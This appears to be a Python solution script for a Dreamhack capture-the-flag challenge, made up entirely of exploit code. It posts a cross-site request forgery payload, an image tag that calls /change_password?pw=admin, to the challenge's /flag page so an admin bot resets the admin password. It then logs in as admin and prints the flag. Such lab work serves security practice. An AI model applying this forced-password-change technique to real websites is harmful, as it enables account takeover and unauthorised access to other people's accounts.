import requests
from bs4 import BeautifulSoup

if __name__ == "__main__":
    debug = {'http': 'http://localhost:8080'}
    url = "http://host3.dreamhack.games:20188"
    payload = {"param": "<img src='/change_password?pw=admin'>"}
    req = requests.post(url+"/flag", payload, proxies=debug)
    flag = requests.post(url+'/login', {'username':'admin', 'password':'admin'})
    print(BeautifulSoup(flag.content, 'html.parser').h1)

